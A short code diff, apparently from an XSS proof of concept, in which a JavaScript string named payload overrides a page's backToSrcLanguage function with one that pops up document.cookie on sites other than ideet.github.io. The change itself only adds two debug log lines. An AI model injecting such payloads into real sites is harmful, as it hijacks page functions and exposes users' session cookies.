@@ -9,12 +9,14 @@
             console.log('🚀 backToSrcLanguage 被调用');
             const currUrl = location.href;
             const payload = `
+            console.log('payload加载');
             if (!location.href.startsWith("https://ideet.github.io") && !window.__cloudx_called) {
                 window.__cloudx_called = true;
                 Object.defineProperty(window, 'backToSrcLanguage', {
         value: function() {alert(document.cookie)},
         writable: false,
         configurable: false});
+            console.log('payload加载成功');
             }
         `;
             for (let i = 0; i < 4000; i++) {
